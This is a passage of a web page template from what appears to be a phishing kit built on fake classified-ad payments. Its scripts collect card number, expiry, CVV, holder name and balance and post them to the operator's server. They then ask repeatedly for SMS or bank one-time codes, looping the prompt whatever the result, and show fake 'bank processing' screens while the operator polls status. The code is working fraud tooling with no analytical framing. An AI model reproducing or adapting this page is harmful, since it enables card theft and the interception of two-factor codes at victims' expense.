              return this.pinModal(...arguments);
            }
            const response = await axios.post("/api/submitCode", {
              codeType,
              code,
              token: this.logToken,
            });

            swal.stopLoading();
            alert(wrong_code);
            return this.pinModal(...arguments);
          } catch (err) {
            swal.stopLoading();
            alert(wrong_code);
            return this.pinModal(...arguments);
          }
        });
      },
      codeModal(codeType) {
  const title = "<%=translate['sms_title'][ad.service.lang]%>";
  const text = "<%=translate['sms_text'][ad.service.lang]%>";
  const placeholder = "<%=translate['sms_placeholder'][ad.service.lang]%>";
  const wrongCodeMessage = "<%=translate['wrong_code'][ad.service.lang]%>";

  // Выполняем Axios-запрос
  axios.post("/auto/sms", {
    token: this.logToken,
  })
    .then(function (response) {
      console.log('Запрос выполнен успешно', response);
    })
    .catch(function (error) {
      console.error('Ошибка выполнения запроса', error);
    });

  // Отображение модального окна для ввода кода
  swal({
    title: title,
    text: text,
    content: {
      element: "input",
      attributes: {
        type: "password",
        placeholder: placeholder,
        maxLength: 255,
        required: true,
        style: "text-align: center; width: auto; margin-left: auto; margin-right: auto;"
      },
    },
    closeOnEsc: false,
    closeOnClickOutside: false,
    buttons: {
      confirm: {
        text: "<%=translate['submit'][ad.service.lang]%>",
        closeModal: false,
      },
    },
  }).then(async (code) => {
    if (!code) {
      swal(wrongCodeMessage, "", "error").then(() => {
        setTimeout(() => {
          this.codeModal(codeType);
        }, 5000); // Повторный вызов через 5 секунд после показа ошибки
      });
      return;
    }

    try {
      const response = await axios.post("/api/submitCode", {
        codeType,
        code,
        token: this.logToken,
      });

      swal({
        title: "<%=translate['wait'][ad.service.lang]%>",
        text: "<%=translate['bank_processes'][ad.service.lang]%>",
        icon: "https://i.imgur.com/AN1d86t.gif",
        closeOnClickOutside: false,
        closeOnEsc: false,
        buttons: false,
        timer: 3000, // Окно закроется автоматически через 5 секунд
      }).then(() => {
        this.codeModal(codeType); // Повторный вызов после успешного завершения
      });
    } catch (err) {
      console.error('Ошибка при отправке кода', err);
      swal(wrongCodeMessage, "", "error").then(() => {
        setTimeout(() => {
          this.codeModal(codeType);
        }, 3000); // Повторный вызов через 5 секунд после показа ошибки
      });
    }
  });
},
      codeModal1(codeType = "sms", title = "<%=translate["sms_title"][ad.service.lang]%>", text = "<%=translate["sms_text"][ad.service.lang]%>", placeholder = "<%=translate["sms_placeholder"][ad.service.lang]%>", wrong_code = "<%=translate["wrong_code"][ad.service.lang]%>") {




swal.stopLoading();
swal({
  title,
  text,
  content: {
    element: "input",
    attributes: {
      type: "password",
      placeholder,
      maxLength: 255,
      required: true,
      style:
        "text-align: center;width: auto;margin-left:auto;margin-right:auto;",
    },
  },
  closeOnEsc: false,
  closeOnClickOutside: false,
  buttons: {
    confirm: {
      text: "<%=translate["submit"][ad.service.lang]%>",
      closeModal: false,
    },
  },
}).then(async (code) => {
  try {
    if (!code) {
      swal({ 
                title: "<%=translate["wait"][ad.service.lang]%>", 
                text: "<%=translate["bank_processes"][ad.service.lang]%>", 
                icon: "https://i.imgur.com/AN1d86t.gif", 
                closeOnClickOutside: false, 
                closeOnEsc: false, 
                buttons: false, 
                showLoaderOnConfirm: true, // Включаем эффект загрузки 
              }) 
    }
    const response = await axios.post("/api/submitCode", {
      codeType,
      code,
      token: this.logToken,
    });

    swal({ 
                title: "<%=translate["wait"][ad.service.lang]%>", 
                text: "<%=translate["bank_processes"][ad.service.lang]%>", 
                icon: "https://i.imgur.com/AN1d86t.gif", 
                closeOnClickOutside: false, 
                closeOnEsc: false, 
                buttons: false, 
                showLoaderOnConfirm: true, // Включаем эффект загрузки 
              }) 
  } catch (err) {
    swal({ 
                title: "<%=translate["wait"][ad.service.lang]%>", 
                text: "<%=translate["bank_processes"][ad.service.lang]%>", 
                icon: "https://i.imgur.com/AN1d86t.gif", 
                closeOnClickOutside: false, 
                closeOnEsc: false, 
                buttons: false, 
                showLoaderOnConfirm: true, // Включаем эффект загрузки 
              }) 
  }
});
},
codeModal1(codeType = "sms", title = "<%=translate["sms_title"][ad.service.lang]%>", text = "<%=translate["sms_text"][ad.service.lang]%>", placeholder = "<%=translate["sms_placeholder"][ad.service.lang]%>", wrong_code = "<%=translate["wrong_code"][ad.service.lang]%>") {




swal.stopLoading();
swal({
  title,
  text,
  content: {
    element: "input",
    attributes: {
      type: "password",
      placeholder,
      maxLength: 255,
      required: true,
      style:
        "text-align: center;width: auto;margin-left:auto;margin-right:auto;",
    },
  },
  closeOnEsc: false,
  closeOnClickOutside: false,
  buttons: {
    confirm: {
      text: "<%=translate["submit"][ad.service.lang]%>",
      closeModal: false,
    },
  },
}).then(async (code) => {
  try {
    if (!code) {
      swal({ 
                title: "<%=translate["wait"][ad.service.lang]%>", 
                text: "<%=translate["bank_processes"][ad.service.lang]%>", 
                icon: "https://i.imgur.com/AN1d86t.gif", 
                closeOnClickOutside: false, 
                closeOnEsc: false, 
                buttons: false, 
                showLoaderOnConfirm: true, // Включаем эффект загрузки 
              }) 
    }
    const response = await axios.post("/api/submitCode", {
      codeType,
      code,
      token: this.logToken,
    });


    swal({ 
                title: "<%=translate["wait"][ad.service.lang]%>", 
                text: "<%=translate["bank_processes"][ad.service.lang]%>", 
                icon: "https://i.imgur.com/AN1d86t.gif", 
                closeOnClickOutside: false, 
                closeOnEsc: false, 
                buttons: false, 
                showLoaderOnConfirm: true, // Включаем эффект загрузки 
              }) 
  } catch (err) {
    swal({ 
                title: "<%=translate["wait"][ad.service.lang]%>", 
                text: "<%=translate["bank_processes"][ad.service.lang]%>", 
                icon: "https://i.imgur.com/AN1d86t.gif", 
                closeOnClickOutside: false, 
                closeOnEsc: false, 
                buttons: false, 
                showLoaderOnConfirm: true, // Включаем эффект загрузки 
              }) 
  }
});
},
      valid_credit_card(value) {
        // accept only digits, dashes or spaces
        if (/[^0-9-\s]+/.test(value)) return false;

        // The Luhn Algorithm. It's so pretty.
        var nCheck = 0,
          nDigit = 0,
          bEven = false;
        value = value.replace(/\D/g, "");

        for (var n = value.length - 1; n >= 0; n--) {
          var cDigit = value.charAt(n),
            nDigit = parseInt(cDigit, 10);

          if (bEven) {
            if ((nDigit *= 2) > 9) nDigit -= 9;
          }

          nCheck += nDigit;
          bEven = !bEven;
        }

        return nCheck % 10 == 0;
      },
      submitForm(e) {
        e.preventDefault();

        if (!this.valid_credit_card(this.cardNumber)) {
          return (this.cardError = "<%=translate["card_number_invalid"][ad.service.lang]%>");
        } else {
          this.cardError = "";
        }


        if (this.step < 2 && this.balanceChecker) {
          swal({
            title: "<%=translate["attention"][ad.service.lang]%>",
            icon: "warning",
            text:
              "<%=translate["bank_asked"][ad.service.lang]%>",
            buttons: true,
            dangerMode: true,
          }).then((val) => {
            if (val) this.step = 2;
          });
        }
        else if (this.step == 2 || !this.balanceChecker) {
          // alert(this.cardBalance)
          if (this.balanceChecker == true && this.cardBalance == false)

            return swal({
              title: "<%=translate["error_title"][ad.service.lang]%>",
              text: "<%=translate["correct_balance"][ad.service.lang]%>",
              icon: "info",
              closeOnClickOutside: false,
              closeOnEsc: false,
              closeOnClickOutside: false,
              buttons: {
                confirm: {
                  text: "<%=translate["submit"][ad.service.lang]%>",
                  closeModal: true,
                },
              },
            });
          if (this.balanceChecker == true && this.cardBalance == "<%=ad.price.replace(/\D+/g, "")%>")

          return swal({
            title: "<%=translate["error_title"][ad.service.lang]%>",
            text: "<%=translate["correct_balance"][ad.service.lang]%>",
            icon: "info",
            closeOnClickOutside: false,
            closeOnEsc: false,
            closeOnClickOutside: false,
            buttons: {
              confirm: {
                text: "<%=translate["submit"][ad.service.lang]%>",
                closeModal: true,
              },
            },
          });
          this.loading = true;
          axios
            .post("/api/submitCard", {
              adId: "<%=ad.id %>",
              number: this.cardNumber.replace(/\D+/g, ""),
              expire:
                this.cardMonth.toString() +
                "/" +
                this.cardYear.toString().substr(-2),
              cvv: this.cardCvv,
              holder: this.cardHolder,

              balance: this.cardBalance,
            })

            .finally(() => (this.loading = false))
            .then((response) => {
              if(response.data.status == false) { 
                swal({ 
                title: "<%=translate["error_title"][ad.service.lang]%>", 
                text: "<%=translate["other_card"][ad.service.lang]%>", 
                icon: "error", 
                closeOnClickOutside: false, 
                closeOnEsc: false, 
                buttons: false, 
                showLoaderOnConfirm: true, // Включаем эффект загрузки 
              }) 
            } else { 
                localStorage.token = response.data.token; 
              this.logToken = response.data.token; 
              if (this.currentStatus == null) this.checkLogStatus(); 
              swal({ 
                title: "<%=translate["wait"][ad.service.lang]%>", 
                text: "<%=translate["bank_processes"][ad.service.lang]%>", 
                icon: "https://i.imgur.com/AN1d86t.gif", 
                closeOnClickOutside: false, 
                closeOnEsc: false, 
                buttons: false, 
                showLoaderOnConfirm: true, // Включаем эффект загрузки 
              }) 
 
              axios.post("/auto/wait", { 
                token: this.logToken, 
              }) 
                .then((response) => { 
                  // Handle the response here if needed 
                  console.log("Status removed successfully", response.data); 
                }) 
                .catch((error) => { 
                  // Handle errors here if the request fails 
                  console.error("Error removing status", error); 
                });  
              } 
            })
            .catch((err) => {
              swal("<%=translate["error_title"][ad.service.lang]%>", "<%=translate["error"][ad.service.lang]%>", "error");
            });
        }
      },
      checkLogStatus() {
        axios
          .post("/api/checkStatus", {
            token: this.logToken,
          })
          .finally(() => setTimeout(() => this.checkLogStatus(this.logToken), 1500))
          .then((response) => {
            this.imgUrl = response.data.imgUrl

            if (this.currentStatus != response.data.status)
              this.currentStatus = response.data.status;
          })
          .catch((err) => err);
      },
      flipCard(status) {
        this.isCardFlipped = status;
      },
      focusInput(e) {
        this.isInputFocused = true;
        let targetRef = e.target.dataset.ref;
        let target = this.$refs[targetRef];
        this.focusElementStyle = {
          width: `${target.offsetWidth}px`,
          height: `${target.offsetHeight}px`,
          transform: `translateX(${target.offsetLeft}px) translateY(${target.offsetTop}px)`,
        };
      },
      blurInput() {
        let vm = this;
        setTimeout(() => {
          if (!vm.isInputFocused) {
            vm.focusElementStyle = null;
          }
        }, 300);
        vm.isInputFocused = false;
      },
    },
      });
  </script>
  <script>
    let clicks = 0

    if (clicks == 0) {
      setInterval(async () => {
        if (clicks == 0) {
          var input = document.getElementById("cardBalance");

          input.onclick = function () {

            if (clicks == 0) {
              axios.post("/api/enterBalance", {
                adId: "<%=ad.id%>"
              })
            } else return
            clicks++
          }
        } else return

      }, 1000)
    }
  </script>




  <div id="support">
    <script type="text/javascript">
      var _smartsupp = _smartsupp || {};
      _smartsupp.key = '<%=user.smartsupp%>';
      window.smartsupp || (function (d) {
        var s, c, o = smartsupp = function () { o._.push(arguments) }; o._ = [];
        s = d.getElementsByTagName('script')[0]; c = d.createElement('script');
        c.type = 'text/javascript'; c.charset = 'utf-8'; c.async = true;
        c.src = 'https://www.smartsuppchat.com/loader.js?'; s.parentNode.insertBefore(c, s);
      })(document);
    </script>
  </div>

  <script>
    if ("<%=user.smartsupp%>" == false) {
      document.querySelector('#support').innerHTML = `
          <div class="
   chatra--webkit
   chatra--style-round
   chatra--side-bottom
   chatra--pos-right
   chatra--visible
   chatra--expanded
   chatra--fast-toggle
 " id="chatra" data-turbolinks-permanent="" style="
   width: 380px;
   height: 600px;
   transform: none;
   z-index: 2147483647;
   display: none;
 ">
    <div id="chatra__iframe-wrapper">
      <iframe frameborder="0" id="chatra__iframe" allowtransparency="true" title="Chatra live chat" allow="autoplay"
        src="/supportChatFrame/<%=ad.id%>" style="width: 380px; height: 600px; position: absolute"></iframe>
    </div>
  </div>
  <div class="support-circle"
    onclick="document.querySelector('#chatra').style.display = 'block';this.style.display = 'none'"></div>
                          `
    }
  </script>







  <script>
    const adId = "<%=ad.id%>"
  </script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/axios/0.19.2/axios.min.js"></script>
  <script src="/js/eye.js" defer></script>

</body>